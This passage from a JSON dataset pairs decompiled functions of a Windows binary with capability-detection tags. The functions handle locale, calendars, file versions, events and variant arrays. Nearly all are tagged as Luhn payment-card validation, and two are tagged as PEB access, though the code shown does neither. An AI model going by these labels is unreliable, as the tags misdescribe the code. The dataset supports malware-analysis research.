        "decompiled_code": "\nvoid fcn.0040be98(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40bfab;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040be5c(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.00404df4();\n        fcn.0040be5c(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.00404df4();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040be5c(&var_14h, 6, &stack0xfffffffc);\n        fcn.00404df4();\n        fcn.0040be5c(&var_18h, 6, &stack0xfffffffc);\n        fcn.00404df4();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.00404dc4(0x40bfb2);\n    return;\n}\n",
        "token_count": 440
    },
    "0040c070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040c070(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40c107;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040bde4(puVar3);\n    iVar1 = fcn.00408f00();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040bfbc, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x4958f0;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040bff8;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040bff8, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00404da0(0x40c10e);\n    return;\n}\n",
        "token_count": 401
    },
    "0040c35c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c35c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uchar auStack1116 [256];\n    uchar *puStack860;\n    uchar uStack856;\n    uint *puStack852;\n    uchar uStack848;\n    int32_t iStack844;\n    uchar uStack840;\n    int32_t iStack836;\n    uchar uStack832;\n    uint uStack828;\n    uchar uStack824;\n    uint var_330h;\n    int32_t var_32ch;\n    int32_t var_320h;\n    uchar auStack790 [256];\n    uint var_212h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1(param_2, &var_330h, 0x1c);\n    if (var_320h == 0x1000) {\n        iVar3 = var_32ch;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_32ch, &var_212h, 0x105);\n        if (iVar2 != 0) {\n            var_8h = param_2 - var_32ch;\n            goto code_r0x0040c3d2;\n        }\n    }\n    iVar3 = *0x4957f4;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_8h = fcn.0040c350();\ncode_r0x0040c3d2:\n    fcn.0040d448(iVar3);\n    fcn.004095dc();\n    iStack836 = 0x40c4dc;\n    uStack828 = 0x40c4dc;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        iStack836 = fcn.00405264();\n        iVar3 = fcn.00409568();\n        if ((iVar3 != 0) && (*(iStack836 + -1 + iVar3) != '.')) {\n            uStack828 = 0x40c4e0;\n        }\n    }\n    uVar4 = fcn.00405f40(*(*0x492cc8 + 4), auStack790, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.00403e38();\n    puStack860 = auStack1116;\n    uStack856 = 4;\n    puStack852 = &var_10dh;\n    uStack848 = 6;\n    iStack844 = var_8h;\n    uStack840 = 5;\n    uStack832 = 6;\n    uStack824 = 6;\n    fcn.00409c40(4, &puStack860);\n    fcn.00409568();\n    return;\n}\n",
        "token_count": 651
    },
    "0040c5ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c5ac(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00404df4();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "0040c5e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c5e8(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40c5fc;\n        fcn.0040427c();\n    }\n    uStack44 = 0x40c642;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040c5e8::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.00409c80(arg_8h_00);\n    fcn.00404df4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40c649;\n    iStack48 = 0x40c641;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 263
    },
    "0040c668": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c668(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00406a50();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "0040c6a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6a4(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40c6ba;\n        fcn.0040427c();\n    }\n    uStack48 = 0x40c710;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040c6a4::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.00406a50();\n    fcn.00409c80(arg_8h_00);\n    fcn.00404df4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40c717;\n    iStack52 = 0x40c70f;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 279
    },
    "0040c834": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040c834(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40c8d0;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.00406a50();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.00404e38();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40c8d7;\n    fcn.00404da0();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 394
    },
    "0040c8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c8f0(uint arg_8h)\n\n{\n    fcn.0040c834();\n    fcn.0040c8e0();\n    return;\n}\n",
        "token_count": 44
    },
    "0040c924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040c924(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040c988:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040c991;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040c988;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040c991:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 550
    },
    "0040cb88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cb88(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40cc41;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040c924();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40cbdf;\n            iVar3 = fcn.0040c9bc(&stack0xfffffffc);\n            goto code_r0x0040cc14;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040cb88::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.00406a50();\n            iVar3 = fcn.0040c5e8(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040cc14;\n        }\n    }\n    iVar3 = fcn.0040c5ac();\ncode_r0x0040cc14:\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40cc48;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 483
    },
    "0040cdf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040cdf4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x40ceca;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_8h = 0xffffffff;\n    puStack48 = 0x40ce21;\n    fcn.00404e38();\n    puStack48 = 0x40ce29;\n    fcn.004052b4();\n    puStack48 = &fcn.0040cdf4::var_ch;\n    uStack52 = 0x40ce35;\n    uStack52 = fcn.00405264();\n    puStack56 = 0x40ce3b;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40ce48;\n        pBlock = fcn.00402ce4();\n        uStack60 = 0x40cead;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.00405264(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40cedc, &fcn.0040cdf4::lplpBuffer, &fcn.0040cdf4::puLen);\n            if (iVar1 != 0) {\n                var_8h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.00402d00(0x40ceb4);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40ced1;\n    puStack48 = 0x40cec9;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 595
    },
    "0040d4bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d4bc(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint var_1h;\n    \n    sub.kernel32.dll_GetCPInfo(0, arg_8h + -0x14);\n    for (iVar4 = 0; (iVar4 < 0xc && ((*(arg_8h + -0xe + iVar4) | *(arg_8h + -0xd + iVar4)) != 0)); iVar4 = iVar4 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar4);\n        uVar1 = *(arg_8h + -0xd + iVar4);\n        if (var_1h <= uVar1) {\n            cVar3 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x49081c;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar3 = cVar3 + -1;\n            } while (cVar3 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 340
    },
    "0040db94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040db94(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40dc1f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == 0) {\n        iVar1 = fcn.0040c668();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        puStack32 = &stack0xfffffffc;\n        fcn.0040bd98();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar1 = fcn.0040c6a4(1, &var_10h);\n    }\n    *(iVar1 + 0xc) = in_EAX;\n    fcn.004047cc();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40dc26;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 330
    },
    "0040de44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040de44(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 291
    },
    "0040e1e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e1e4(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40e1f3;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40e256;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40e238;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.00405264();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 252
    },
    "0040f488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0040f488(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x40f4d2;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    fcn.00406a50();\n    fcn.0040c5ac();\n    fcn.004047cc();\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x40f4d9;\n    uStack16 = 0x40f4d1;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 180
    },
    "0040f4dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f4dc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x40f56b;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.004111c0();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.004111c0();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h, arg_ch);\n    fcn.004047cc();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x40f572;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 309
    },
    "0040f5cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f5cc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x40f65b;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.004111c0();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.004111c0();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00406a50();\n    fcn.0040c5e8(arg_8h, arg_ch);\n    fcn.004047cc();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x40f662;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 309
    },
    "0040f9b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f9b8(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 184
    },
    "0040f9e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f9e8(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0040f9e8(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 241
    },
    "0040fa44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040fa44(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.0040f910();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.0040f910();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0040f910();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0040f9b8(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.0040f910();\n                fcn.0040fc3c();\n            }\n            cVar1 = fcn.0040f9e8(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.0040f910();\n    return;\n}\n",
        "token_count": 641
    },
    "0040fc58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040fc58(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0040fc88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fc88(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0040fc88(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "0040fce4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
